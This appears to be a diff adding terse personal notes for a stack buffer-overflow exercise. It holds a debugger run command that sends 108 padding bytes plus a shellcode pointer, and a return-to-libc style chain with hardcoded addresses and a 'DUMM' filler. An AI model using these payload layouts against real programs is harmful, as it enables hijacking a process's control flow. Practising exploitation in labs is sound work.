@@ -1,0 +1,9 @@
+edx execute pointer of pointer
+-> PTR_SHELLCODE = addr to SHELLCODE
+-> SHELLCODE = shellcode
+
+r $(python -c "print 'A' * 108 + '$PTR_SHELLCODE")
+
+0xf7c8e980 + "DUMM" + 0xffffdf57
+
+0xffffdfb4
